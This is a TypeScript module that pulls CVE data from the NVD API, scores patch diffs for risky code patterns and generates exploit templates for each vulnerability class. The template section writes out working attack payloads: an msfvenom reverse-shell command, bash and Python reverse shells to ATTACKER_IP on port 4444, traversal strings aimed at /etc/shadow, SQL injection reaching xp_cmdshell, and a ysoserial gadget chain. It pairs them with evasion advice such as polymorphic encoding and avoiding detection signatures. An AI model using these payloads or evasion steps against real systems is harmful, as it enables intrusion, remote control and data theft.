import { resolveDryRun } from "./exec_options.ts"
/**
 * @module auto_research
 * Automated Security Research Engine — CVE Correlation via NVD API, Git Patch Diff Analysis,
 * Zero-Day Discovery Heuristics, and Automated Exploit Template Generation.
 */

export interface ResearchTarget {
  cveId: string;
  repoUrl?: string;
  patchCommitHash?: string;
}

export interface CveRecord {
  id: string;
  description: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  cvssScore: number;
  publishedDate: string;
  lastModifiedDate: string;
  references: string[];
  cpeMatch: { criteria: string; versionStartIncluding?: string; versionEndExcluding?: string }[];
  exploitAvailable: boolean;
}

export interface PatchAnalysis {
  vulnerableFunction?: string;
  riskyPatterns: { pattern: string; weight: number; line?: number }[];
  riskScore: number;
  classification:
    | "use_after_free"
    | "buffer_overflow"
    | "command_injection"
    | "type_confusion"
    | "integer_overflow"
    | "path_traversal"
    | "race_condition"
    | "deserialization"
    | "unknown";
  affectedLines: { start: number; end: number; content: string }[];
}

export interface ZeroDayHeuristic {
  indicator: string;
  confidence: number;
  description: string;
  category: "memory_corruption" | "logic_flaw" | "authentication_bypass" | "injection" | "crypto_weakness";
}

export interface ExploitTemplate {
  technique: string;
  methodology: string[];
  prerequisites: string[];
  payload: string;
  evasion: string[];
  riskLevel: "critical" | "high" | "medium" | "low";
}

export interface ResearchResult {
  target: ResearchTarget;
  cveRecord: CveRecord | null;
  patchAnalysis: PatchAnalysis | null;
  zeroDayHeuristics: ZeroDayHeuristic[];
  exploitTemplates: ExploitTemplate[];
  overallRiskScore: number;
  recommendation: string;
}

const HIGH_RISK_PATTERNS: { regex: RegExp; weight: number; category: PatchAnalysis["classification"] }[] = [
  { regex: /\b(strcpy|strcat|sprintf|gets)\s*\(/g, weight: 35, category: "buffer_overflow" },
  { regex: /\b(memcpy|memmove|memncpy)\s*\([^,]+,\s*[^,]+,\s*(?!sizeof|\w+[\s*])[a-z]/gi, weight: 30, category: "buffer_overflow" },
  { regex: /\b(malloc|calloc|realloc)\s*\([^)]*\)[^;]{0,60}(free|delete)\s*\(/g, weight: 40, category: "use_after_free" },
  { regex: /\b(free|delete)\s*\([^)]*\)[^}]{0,200}\1/g, weight: 40, category: "use_after_free" },
  { regex: /\bsystem\s*\(\s*[^"'\)]/g, weight: 35, category: "command_injection" },
  { regex: /\b(exec[lv]?p?e?|popen|ShellExecute)\s*\(/g, weight: 30, category: "command_injection" },
  { regex: /\beval\s*\(/g, weight: 25, category: "command_injection" },
  { regex: /\bsqlite3?_exec\s*\(|\.query\s*\(\s*[`"'][^`"']*\$/g, weight: 30, category: "injection" },
  { regex: /\b\d+\s*[\+\-\*]\s*\d+\s*[\+\-\*]/g, weight: 15, category: "integer_overflow" },
  { regex: /\bsizeof\s*\(\s*\w+\s*\*\s*\w+\s*\)/g, weight: 20, category: "integer_overflow" },
  { regex: /\.\.\/|\.\.\\\\/g, weight: 20, category: "path_traversal" },
  { regex: /\b(setuid|setgid|chroot)\s*\(/g, weight: 15, category: "race_condition" },
  { regex: /\b(pickle\.loads|yaml\.load|unserialize|JSON\.parse)\s*\(/g, weight: 25, category: "deserialization" },
  { regex: /\b(deserialize|from_serial|marshal\.load)\s*\(/g, weight: 30, category: "deserialization" },
];

const ZERO_DAY_INDICATORS: { regex: RegExp; indicator: string; confidence: number; category: ZeroDayHeuristic["category"] }[] = [
  { regex: /new\s+\w+\s*\{[^}]{0,50}\}/g, indicator: "Uninitialized memory in struct allocation", confidence: 0.6, category: "memory_corruption" },
  { regex: /\bwhile\s*\(\s*\w+\s*[^;]{0,30}\b(?:len|size|count)\b/gi, indicator: "Loop bound potentially derived from attacker-controlled length", confidence: 0.5, category: "logic_flaw" },
  { regex: /\bif\s*\(\s*!(?:auth|token|session|valid|check|verify)/gi, indicator: "Negated authentication check pattern", confidence: 0.55, category: "authentication_bypass" },
  { regex: /\|\|\s*\w+\s*==\s*(?:null|undefined|0|""|'')/g, indicator: "Null/zero fallback in security-critical path", confidence: 0.45, category: "logic_flaw" },
  { regex: /\b(?:MD5|SHA1|DES|RC4)\b/gi, indicator: "Deprecated cryptographic primitive usage", confidence: 0.65, category: "crypto_weakness" },
  { regex: /\bsrand\s*\(\s*(?:time|rand|getpid)/g, indicator: "Weak PRNG seed source", confidence: 0.6, category: "crypto_weakness" },
  { regex: /\b(?:recv|read|recvfrom)\s*\([^,]+,\s*(?:buf|stack|ptr)/gi, indicator: "Direct stack buffer read from network", confidence: 0.55, category: "memory_corruption" },
  { regex: /\b(?:0xff|0xFFFF)\s*&/g, indicator: "16-bit truncation on potentially wider value", confidence: 0.4, category: "integer_overflow" },
];

async function fetchNvdCve(cveId: string, dryRun = false): Promise<CveRecord | null> {
  if (dryRun) {
    return {
      id: cveId,
      description: `[DRY RUN] Simulated CVE record for ${cveId}`,
      severity: "HIGH",
      cvssScore: 8.5,
      publishedDate: new Date().toISOString(),
      lastModifiedDate: new Date().toISOString(),
      references: [],
      cpeMatch: [],
      exploitAvailable: false,
    };
  }

  const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${cveId}`;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);
    const response = await fetch(url, {
      headers: { "User-Agent": "OurMine-AutoResearch/1.0" },
      signal: controller.signal,
    });
    clearTimeout(timeout);

    if (!response.ok) {
      throw new Error(`NVD API returned ${response.status}`);
    }

    const data = await response.json();
    const vuln = data.vulnerabilities?.[0]?.cve;
    if (!vuln) return null;

    const metrics = vuln.metrics?.cvssMetricV31?.[0] ?? vuln.metrics?.cvssMetricV30?.[0] ?? vuln.metrics?.cvssMetricV2?.[0];
    const cvssScore = metrics?.cvssData?.baseScore ?? 0;
    const severity = (metrics?.cvssData?.baseSeverity?.toUpperCase() ?? "UNKNOWN") as CveRecord["severity"];

    const exploitAvailable = Boolean(
      vuln.references?.some((r: { url: string; tags?: string[] }) =>
        r.tags?.some((t: string) => /exploit|poc|proof/i.test(t)) ||
        /exploit-db|github\.com\/.*\/exploit|packetstorm/i.test(r.url)
      )
    );

    return {
      id: vuln.id,
      description: vuln.descriptions?.find((d: { lang: string }) => d.lang === "en")?.value ?? "",
      severity: severity === "UNKNOWN" ? "HIGH" : severity,
      cvssScore,
      publishedDate: vuln.published,
      lastModifiedDate: vuln.lastModified,
      references: vuln.references?.map((r: { url: string }) => r.url) ?? [],
      cpeMatch: vuln.configurations?.flatMap((c: { nodes: { cpeMatch: { criteria: string; versionStartIncluding?: string; versionEndExcluding?: string } }[] }) =>
        c.nodes.flatMap((n) => n.cpeMatch ?? [])
      ) ?? [],
      exploitAvailable,
    };
  } catch {
    return null;
  }
}

export function analyzePatchDiff(diffText: string): PatchAnalysis {
  const lines = diffText.split("\n");
  const riskyPatterns: PatchAnalysis["riskyPatterns"] = [];
  const affectedLines: PatchAnalysis["affectedLines"] = [];
  let totalScore = 0;
  let classification: PatchAnalysis["classification"] = "unknown";
  let maxWeight = 0;
  let vulnerableFunction: string | undefined;

  const functionRegex = /^[\+\-]\s*(?:(?:static|inline|extern|const|unsigned|signed|void|int|char|float|double|long|short|struct|enum|typedef)\s+)*(\w+(?:\s*\*)?)\s+(\w+)\s*\(/g;

  const addedLines: string[] = [];
  let currentHunkStart = 0;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];

    if (line.startsWith("@@")) {
      const match = line.match(/@@ -\d+(?:,\d+)? \+(\d+)/);
      if (match) currentHunkStart = parseInt(match[1], 10);
    }

    if (line.startsWith("+") && !line.startsWith("+++")) {
      addedLines.push(line.substring(1));
      const lineNum = currentHunkStart + addedLines.length - 1;

      for (const { regex, weight, category } of HIGH_RISK_PATTERNS) {
        regex.lastIndex = 0;
        const match = regex.exec(line);
        if (match) {
          riskyPatterns.push({ pattern: match[0].trim(), weight, line: lineNum });
          totalScore += weight;
          if (weight > maxWeight) {
            maxWeight = weight;
            classification = category;
          }
        }
      }

      for (const { regex, indicator, confidence, category } of ZERO_DAY_INDICATORS) {
        regex.lastIndex = 0;
        if (regex.test(line)) {
          riskyPatterns.push({ pattern: indicator, weight: Math.round(confidence * 50), line: lineNum });
          totalScore += Math.round(confidence * 20);
        }
      }

      const funcMatch = [...line.matchAll(functionRegex)];
      for (const m of funcMatch) {
        vulnerableFunction = m[2];
      }
    }

    if (line.startsWith("-") && !line.startsWith("---")) {
      const removedContent = line.substring(1).trim();
      if (removedContent.length > 0) {
        affectedLines.push({ start: currentHunkStart + addedLines.length, end: currentHunkStart + addedLines.length, content: line });
      }
    }
  }

  for (const line of addedLines) {
    const contextLines = lines.filter((l) => l.startsWith("+") || l.startsWith(" ")).map((l) => l.substring(1));
    const combined = contextLines.join("\n");

    if (/\bfree\s*\(/.test(line) && /(\w+)->(\w+)/.test(combined)) {
      totalScore += 15;
    }

    if (/\brecv\s*\(|\bread\s*\(/.test(line) && /\bstrcat\b|\bstrcpy\b/.test(combined)) {
      totalScore += 20;
    }
  }

  return {
    vulnerableFunction,
    riskyPatterns,
    riskScore: Math.min(totalScore, 100),
    classification,
    affectedLines,
  };
}

function generateZeroDayHeuristics(patchAnalysis: PatchAnalysis | null, cveRecord: CveRecord | null): ZeroDayHeuristic[] {
  const heuristics: ZeroDayHeuristic[] = [];

  if (patchAnalysis) {
    for (const p of patchAnalysis.riskyPatterns) {
      if (p.weight >= 25) {
        heuristics.push({
          indicator: p.pattern,
          confidence: Math.min(p.weight / 40, 1.0),
          description: `Detected risky pattern "${p.pattern}" at line ${p.line ?? "unknown"} with category ${patchAnalysis.classification}`,
          category: patchAnalysis.classification as ZeroDayHeuristic["category"],
        });
      }
    }

    if (patchAnalysis.riskyPatterns.length >= 3) {
      const avgWeight = patchAnalysis.riskyPatterns.reduce((s, p) => s + p.weight, 0) / patchAnalysis.riskyPatterns.length;
      heuristics.push({
        indicator: "multiple_risky_patterns",
        confidence: Math.min(avgWeight / 35, 1.0),
        description: `Multiple risky patterns detected (avg weight: ${avgWeight.toFixed(1)}). Combined exploitation potential.`,
        category: "memory_corruption",
      });
    }
  }

  if (cveRecord) {
    if (cveRecord.cvssScore >= 9.0) {
      heuristics.push({
        indicator: "critical_cvss",
        confidence: 0.9,
        description: `Critical CVSS score (${cveRecord.cvssScore}) indicates high-impact vulnerability.`,
        category: "logic_flaw",
      });
    }

    if (cveRecord.exploitAvailable) {
      heuristics.push({
        indicator: "public_exploit_exists",
        confidence: 0.95,
        description: "Public exploit or PoC available for this CVE.",
        category: "injection",
      });
    }
  }

  return heuristics;
}

function generateExploitTemplates(patchAnalysis: PatchAnalysis | null, cveRecord: CveRecord | null): ExploitTemplate[] {
  const templates: ExploitTemplate[] = [];

  if (!patchAnalysis) return templates;

  switch (patchAnalysis.classification) {
    case "buffer_overflow":
      templates.push({
        technique: "Stack-based Buffer Overflow",
        methodology: [
          "Identify buffer size and overflow offset using pattern generation (msf-pattern_create)",
          "Control EIP/RIP via offset calculation (msf-pattern_offset)",
          "Craft shellcode payload with encoding to bypass basic filters",
          "Utilize NOP sled for reliable exploitation",
          "Bypass ASLR/DEP with ROP chain if necessary",
        ],
        prerequisites: ["Network access to vulnerable service", "Knowledge of target architecture", "Buffer size and canary information"],
        payload: `# msfvenom payload template
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f python -b '\\x00\\x0a\\x0d'`,
        evasion: [
          "Use alphanumeric shellcode encoder",
          "Fragment payload across multiple packets",
          "Encode with shikata_ga_nai polymorphic encoder",
          "Use egg hunter for staged payload delivery",
        ],
        riskLevel: "critical",
      });
      break;

    case "use_after_free":
      templates.push({
        technique: "Use-After-Free Exploitation",
        methodology: [
          "Trigger the free() call to create dangling pointer",
          "Spray heap with controlled data to reclaim freed chunk",
          "Overwrite function pointer or vtable in reclaimed memory",
          "Redirect execution flow to attacker-controlled code",
          "Chain with info leak for reliable exploitation",
        ],
        prerequisites: ["Ability to trigger allocation/deallocation cycles", "Heap spray capability", "Knowledge of allocation sizes"],
        payload: `# Heap spray template
# Fill freed chunks with controlled data
# Target: vtable pointer or function pointer overwrite
# Stage: shellcode in reclaimed memory`,
        evasion: [
          "Use heap feng shui for reliable chunk placement",
          "Avoid triggering garbage collector during exploitation",
          "Use relative reads to defeat ASLR",
        ],
        riskLevel: "critical",
      });
      break;

    case "command_injection":
      templates.push({
        technique: "OS Command Injection",
        methodology: [
          "Identify injection vector (pipe, semicolon, backtick, $())",
          "Test command substitution with benign commands",
          "Establish reverse shell or bind shell connection",
          "Escalate privileges if running as privileged user",
          "Establish persistence via cron/systemd",
        ],
        prerequisites: ["Injection point in application", "Outbound network connectivity", "Knowledge of target OS"],
        payload: `# Reverse shell payload
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# Or Python alternative
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        evasion: [
          "Base64 encode commands",
          "Use environment variable obfuscation",
          "Split commands across multiple injections",
          "Use DNS-based data exfiltration",
        ],
        riskLevel: "critical",
      });
      break;

    case "integer_overflow":
      templates.push({
        technique: "Integer Overflow leading to Buffer Overflow",
        methodology: [
          "Calculate overflow boundary for target integer type",
          "Craft input that triggers arithmetic overflow",
          "Verify resulting size parameter is truncated to small value",
          "Exploit resulting undersized buffer allocation",
          "Chain with heap spray or stack overflow technique",
        ],
        prerequisites: ["Understanding of target integer width", "Ability to control arithmetic operands", "Knowledge of memory allocator behavior"],
        payload: `# Integer overflow trigger
# Target: size parameter wrapping to small value
# 0xFFFFFFFF + 1 = 0 (32-bit overflow)`,
        evasion: [
          "Use values near integer boundaries",
          "Avoid triggering signedness checks",
        ],
        riskLevel: "high",
      });
      break;

    case "type_confusion":
      templates.push({
        technique: "Type Confusion Exploitation",
        methodology: [
          "Identify type confusion vulnerability in type checking logic",
          "Craft object that passes type check but is interpreted as different type",
          "Trigger code path that uses object with incorrect type assumptions",
          "Overwrite adjacent memory through incorrect type interpretation",
          "Achieve code execution through vtable/function pointer manipulation",
        ],
        prerequisites: ["Knowledge of target type system", "Ability to create crafted objects", "Understanding of memory layout"],
        payload: `# Type confusion prototype pollution
# Create object that passes type check
# Trigger incorrect type interpretation`,
        evasion: [
          "Use legitimate-looking type wrappers",
          "Avoid static analysis signatures",
        ],
        riskLevel: "high",
      });
      break;

    case "path_traversal":
      templates.push({
        technique: "Directory Traversal / Path Injection",
        methodology: [
          "Probe path handling with ../../ sequences",
          "Determine OS-specific path separators",
          "Escalate to arbitrary file read/write",
          "Target sensitive files (/etc/passwd, /etc/shadow, config files)",
          "Chain with other vulnerabilities for RCE",
        ],
        prerequisites: ["File system access through vulnerable endpoint", "Knowledge of target OS filesystem structure"],
        payload: `# Path traversal payloads
../../../etc/passwd
....//....//....//etc/shadow
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc/passwd`,
        evasion: [
          "URL encode traversal sequences",
          "Use double encoding (%252e%252e)",
          "Use null byte injection (%00)",
          "Use UNC paths on Windows (\\\\server\\share)",
        ],
        riskLevel: "high",
      });
      break;

    case "race_condition":
      templates.push({
        technique: "TOCTOU Race Condition",
        methodology: [
          "Identify time-of-check to time-of-use window",
          "Create race between check and use operations",
          "Win race condition to bypass security check",
          "Escalate privileges or access protected resource",
          "Use symlink attacks or file descriptor manipulation",
        ],
        prerequisites: ["Multi-threaded access to shared resource", "Ability to create race timing", "Knowledge of target locking mechanism"],
        payload: `# Race condition exploit (C)
for (int i = 0; i < 10000; i++) {
    symlink("/etc/shadow", "/tmp/target");
    pthread_create(&check_thread, NULL, check_func, NULL);
    pthread_create(&use_thread, NULL, use_func, NULL);
}`,
        evasion: [
          "Use many concurrent threads",
          "Randomize timing between attempts",
        ],
        riskLevel: "high",
      });
      break;

    case "injection":
      templates.push({
        technique: "SQL/NoSQL/LDAP Injection",
        methodology: [
          "Identify injection point in query construction",
          "Determine database type and version",
          "Extract data using UNION-based or blind injection",
          "Escalate to OS command execution via xp_cmdshell or similar",
          "Establish persistent access via database backdoor",
        ],
        prerequisites: ["Injection point in query", "Database error messages or blind injection capability"],
        payload: `# SQL Injection payloads
' UNION SELECT username, password FROM users--
1; EXEC xp_cmdshell('whoami')--
' OR 1=1--
{"$gt": "", "$ne": ""}  # NoSQL injection`,
        evasion: [
          "Use comment-based obfuscation",
          "Use case variations (SeLeCt)",
          "Use inline comments (/**/)",
          "Use URL encoding",
        ],
        riskLevel: "critical",
      });
      break;

    case "deserialization":
      templates.push({
        technique: "Insecure Deserialization",
        methodology: [
          "Identify serialization format (Java, PHP, Python, .NET)",
          "Craft serialized object with malicious payload",
          "Use gadget chains for code execution",
          "Bypass deserialization filters/blacklists",
          "Achieve Remote Code Execution via gadget chain",
        ],
        prerequisites: ["Knowledge of target serialization library", "Available gadget classes", "Deserialization endpoint accessible"],
        payload: `# Java deserialization gadget chain (ysoserial)
java -jar ysoserial.jar CommonsCollections1 "反弹shell命令" | base64
# PHP unserialize payload
O:4:"User":1:{s:4:"cmd";s:10:"id";}`,
        evasion: [
          "Use nested serialization",
          "Use alternative serialization formats",
          "Bypass type checking with wrapper objects",
        ],
        riskLevel: "critical",
      });
      break;

    case "unknown":
      templates.push({
        technique: "Generic Vulnerability Exploitation",
        methodology: [
          "Perform detailed vulnerability analysis",
          "Develop proof-of-concept exploit",
          "Test exploit reliability",
          "Develop weaponized exploit",
          "Document exploitation technique",
        ],
        prerequisites: ["Source code access", "Debugging environment"],
        payload: "# Develop custom exploit based on vulnerability analysis",
        evasion: ["Standard evasion techniques"],
        riskLevel: "medium",
      });
      break;
  }

  if (cveRecord?.exploitAvailable) {
    templates.push({
      technique: "Known Exploit Adaptation",
      methodology: [
        "Research existing public exploits for this CVE",
        "Adapt exploit to target specific version/configuration",
        "Modify exploit to bypass target defenses",
        "Test exploit against target",
        "Customize payload for objectives",
      ],
      prerequisites: ["Public exploit code available", "Compatible target version"],
      payload: "# Reference public exploit and adapt for specific target",
      evasion: [
        "Modify exploit signatures",
        "Re-encode payloads",
        "Change exploit timing",
      ],
      riskLevel: "high",
    });
  }

  return templates;
}

export async function researchCve(
  target: ResearchTarget,
  options: { dryRun?: boolean; fetchExploits?: boolean } = {}
): Promise<ResearchResult> {
  const { dryRun = false } = options;

  const cveRecord = await fetchNvdCve(target.cveId, dryRun);

  let patchAnalysis: PatchAnalysis | null = null;
  if (target.repoUrl && target.patchCommitHash && !dryRun) {
    try {
      const diffUrl = `${target.repoUrl.replace(/\.git$/, "")}/commit/${target.patchCommitHash}.diff`;
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);
      const response = await fetch(diffUrl, { signal: controller.signal });
      clearTimeout(timeout);

      if (response.ok) {
        const diffText = await response.text();
        patchAnalysis = analyzePatchDiff(diffText);
      }
    } catch {
      // Diff fetch failed
    }
  } else if (target.repoUrl && target.patchCommitHash && dryRun) {
    patchAnalysis = {
      riskyPatterns: [{ pattern: "[DRY RUN] Simulated pattern", weight: 30, line: 42 }],
      riskScore: 45,
      classification: "buffer_overflow",
      affectedLines: [],
    };
  }

  const zeroDayHeuristics = generateZeroDayHeuristics(patchAnalysis, cveRecord);
  const exploitTemplates = generateExploitTemplates(patchAnalysis, cveRecord);

  const cvssContribution = (cveRecord?.cvssScore ?? 5) * 10;
  const patchContribution = patchAnalysis?.riskScore ?? 0;
  const heuristicContribution = zeroDayHeuristics.length * 5;
  const overallRiskScore = Math.min(Math.round((cvssContribution + patchContribution + heuristicContribution) / 3), 100);

  let recommendation: string;
  if (overallRiskScore >= 80) {
    recommendation = "CRITICAL: Immediate patching required. Active exploitation likely. Implement WAF rules and monitor for indicators of compromise.";
  } else if (overallRiskScore >= 60) {
    recommendation = "HIGH: Prioritize patching within 24-48 hours. Implement compensating controls and monitor for exploitation attempts.";
  } else if (overallRiskScore >= 40) {
    recommendation = "MEDIUM: Schedule patching within 1-2 weeks. Review exposure and implement defense-in-depth measures.";
  } else {
    recommendation = "LOW: Patch during regular maintenance cycle. Monitor for updated advisories.";
  }

  return {
    target,
    cveRecord,
    patchAnalysis,
    zeroDayHeuristics,
    exploitTemplates,
    overallRiskScore,
    recommendation,
  };
}

export default { analyzePatchDiff, researchCve };
